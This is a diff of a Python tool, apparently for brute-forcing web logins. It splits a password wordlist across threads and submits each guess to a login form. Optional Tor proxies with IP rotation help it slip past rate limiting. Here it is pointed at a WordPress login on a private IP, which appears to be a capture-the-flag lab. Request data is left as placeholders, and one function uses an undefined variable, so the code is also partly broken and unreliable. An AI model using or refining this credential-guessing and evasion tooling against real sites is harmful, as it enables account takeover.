@@ -11,19 +11,21 @@ from Dependincies import MakeTorProxies
 
 
 UseProxies = useProxies.UseProxies
+
 class Main:
-    def __init__(self, password_path: str, number_of_proxies_and_threads: int, website_uri: str, indicator: str):
+    def __init__(self, password_path: str, number_of_proxies_and_threads: int, website_uri: str, indicator: str, tor: bool):
         self.num_of_proxies_and_threads = number_of_proxies_and_threads
         self.website = website_uri
+        self.tor_status = tor
         if indicator.startswith('u'):
             self.result = [indicator[0], indicator[1:]]
         elif indicator.startswith('s'):
             self.result = [indicator[0], indicator[1:]]
-        self.tor = MakeTorProxies.Make()
-        self.tor.config_multiple_tor_proxies(self.num_of_proxies_and_threads)
+        if tor:
+            self.tor = MakeTorProxies.Make()
+            self.tor.config_multiple_tor_proxies(self.num_of_proxies_and_threads)
         with open(password_path, 'r') as file:
             self.lines = file.readlines()
-
         self.used = []
         self.t_used = []
         self.unused = []
@@ -39,23 +41,22 @@ class Main:
         self.t1 = time()
         print('\n')
         try:
-            while self.run:
-                threads = []
-                for i in range(self.num_of_proxies_and_threads):
-                    t = Thread(target=self.temp, args=(i,))
-                    threads.append(t)
-                    t.start()
-
-                for t in threads:
-                    t.join()
-
-            self.reset_everything_and_try_again()
+            if not self.tor_status:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=self.num_of_proxies_and_threads) as executor:
+                    futures = [executor.submit(self.temp, i) for i in range(self.num_of_proxies_and_threads)]
+                    concurrent.futures.wait(futures)
+            elif self.tor_status:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=self.num_of_proxies_and_threads) as executor:
+                    futures = [executor.submit(self.temp_w_tor, i) for i in range(self.num_of_proxies_and_threads)]
+                    concurrent.futures.wait(futures)
+            if self.tor_status:
+                self.reset_everything_and_try_again()
 
 
         finally:
             print('\n[*] Closing threads...')
             self.run = False
-            print(f"\n[!] Tried {len(self.used)} passwords.\n")
+            print(f"[!] Tried {len(self.used)} passwords.")
             print(f"[+] Finished requests in {round(time() - self.t1, 2)} seconds\n")
             exit()
 
@@ -78,29 +79,62 @@ class Main:
 
 
     def temp(self, z):
+        self.run = True
         total_lines = len(self.lines)
         start = z * (total_lines // self.num_of_proxies_and_threads)
         end = (z + 1) * (total_lines // self.num_of_proxies_and_threads)
+        start_line = max(1, min(start, total_lines))
+        end_line = min(end, total_lines)
 
         # Adjusting indices to match Python's 0-based indexing
-        start_index = start
-        end_index = end
+        start_index = start_line - 1
+        end_index = end_line
 
         # Reading lines between start_index and end_index
-        selected_lines = self.lines[start_index:end_index]
-        while self.run:
+        selected_lines = self.lines[start_index+1:end_index]
+        while self.run is True:
             for password in selected_lines:
                 if len(self.timeout_list) >= 10 or not self.run:
                     self.run = False
                     break
-                
-                password = password.strip()
-                if password in self.used and password not in self.unused:
+                if password in self.used:
                     continue
-                r = UseProxies(self.website, {'guess': password, 'Guess': 'submit'},
-                               z + 9052)
+                password = password.strip()
+                r = UseProxies(self.website, **YOUR DATA HERE**, self.tor_status)
+                r.thread(self.result)
+                self.used.append(password)
+                self.unused.remove(password)
+                print(
+                    f"\033[2A\033[K[!] Trying {round(len(self.used) / (time() - self.t1), 3)} request(s) per second\n[!] Finished {len(self.used)}/{total_lines}\n[+] Requested {password}",
+                    end='\r')
+    def temp_w_tor(self, z):
+        self.run = True
+        total_lines = len(self.lines)
+        start = z * (total_lines // self.num_of_proxies_and_threads)
+        end = (z + 1) * (total_lines // self.num_of_proxies_and_threads)
+        start_line = max(1, min(start, total_lines))
+        end_line = min(end, total_lines)
+
+        # Adjusting indices to match Python's 0-based indexing
+        start_index = start_line - 1
+        end_index = end_line
+
+        # Reading lines between start_index and end_index
+        selected_lines = self.lines[start_index+1:end_index]
+        while self.run is True:
+            for password in selected_lines:
+                if len(self.timeout_list) >= 10 or not self.run:
+                    self.run = False
+                    break
+                if password in self.used:
+                    continue
+                password = password.strip()
+                r = UseProxies(self.website, **YOUR DATE HERE**, z + 9052)
                 try:
-                    r.thread(self.result)
+                    if not tor_status:
+                        r.thread(self.result)
+                    elif tor_status:
+                        r.thread_w_tor(self.result)
                 except StopAsyncIteration:
                     self.timeout_dict_1[password] = z + 9052
                     self.timeout_list.append(password)
@@ -111,16 +145,14 @@ class Main:
                     self.timeout_dict_1 = {}
                     self.run = False
                     break
-                self.unused.remove(password)
                 self.used.append(password)
+                self.unused.remove(password)
                 print(
                     f"\033[2A\033[K[!] Trying {round(len(self.used) / (time() - self.t1), 3)} request(s) per second\n[!] Finished {len(self.used)}/{total_lines}\n[+] Requested {password} from TOR on port {z + 9052}",
                     end='\r')
-
                 GetNewIp.main(z)
-            break
 
 
 if __name__ == '__main__':
-    main = Main('nums.txt', 20, 'https://www.guessthepin.com/prg.php', 'uSorry')
+    main = Main('/root/Game_Zone/Starters/mrrobot/sotred.dic', 30, 'https://10.10.74.90/wp-login.php', 'uincorrect', False)
     main.main()
